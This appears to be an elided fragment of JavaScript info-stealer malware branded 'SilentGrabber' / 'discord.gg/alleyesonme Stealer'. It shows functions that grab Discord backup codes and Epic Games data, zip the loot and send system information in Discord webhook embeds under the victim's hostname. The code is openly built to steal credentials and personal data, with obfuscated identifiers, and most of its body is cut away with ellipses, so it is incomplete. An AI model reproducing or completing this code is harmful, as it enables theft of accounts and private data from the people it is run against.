        ...
        if (currentFile === 'discord_backup_codes.txt') {
          ...
          try {
            ...
            const embed = {
              ...
              footer: {
                  text: `${user.hostname} | github.com/SilentGrabber0 | discord.gg/alleyesonme`,
                  icon_url: 'https://cdn.discordapp.com/attachments/1246337883623784468/1286415376753623142/Silent.png?ex=66ee7bee&is=66ed2a6e&hm=0b5e0dab23e6d6b14227bdc7e8627a62762a49a0405a8fc6bbc6572e9315b41c&',
              },
            };
...
user = {
        ...
        start: Date.now(),
        debug: false,
        copyright: '<================[discord.gg/alleyesonme ]>================>\n\n',
        url: null,
        locale: locale,
    }
_0x2afdce = {}
...
async function StealEpicGames() {
    try {
        ...
        if (fs.existsSync(epicPath)) {
            ...
            const howToUseContent = `<================[discord.gg/alleyesonme Stealer]>================>\n\n
...
async function archiveAndSendData() {
    ...
    try {
        ...
        archive.addZipComment('All the Information was Stealed by discord.gg/alleyesonme.');
...
try {
    ...
    const combinedInfoEmbed = {
        ...
        color: 0x303037,
        author: {
            name: `${user.hostname} | System Information | discord.gg/alleyesonme`,
            icon_url: 'https://cdn.discordapp.com/attachments/1246337883623784468/1286415376753623142/Silent.png?ex=66ee7bee&is=66ed2a6e&hm=0b5e0dab23e6d6b14227bdc7e8627a62762a49a0405a8fc6bbc6572e9315b41c&',
        },
        fields: [
            {
